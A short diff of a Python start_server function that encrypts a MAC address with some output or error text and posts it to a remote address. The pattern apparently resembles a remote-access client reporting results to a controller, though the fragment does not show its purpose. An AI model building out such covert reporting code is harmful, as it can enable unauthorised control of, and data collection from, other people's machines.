@@ -127,7 +127,7 @@ def start_server():
                     except Exception as e:
                         txt = str(e)
 
-                    txt = eu.encrypt1(f"{mac}\n{txt}").encode("utf-8")
+                    txt = eu.encrypt1(f"{mac}\n{txt}").encode("utf-8").decode('utf-8')
                     print(txt)
                     headers = {'Content-Type': 'text/plain'}
                     r2 = requests.post(ip, data=txt, headers=headers)
